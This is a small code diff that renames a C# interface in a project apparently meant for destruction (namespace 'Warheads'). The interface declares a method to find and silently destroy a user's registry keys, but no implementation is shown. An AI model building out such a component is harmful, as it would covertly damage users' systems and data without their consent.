@@ -1,6 +1,6 @@
 namespace NukeOneStart.Warheads.Interfaces
 {
-    public interface IRegistryHunter
+    public interface IRegistryWarhead
     {
         public void FindAndDestroyUserRegistryKeys();       // Silently Destroy Registry Keys
     }
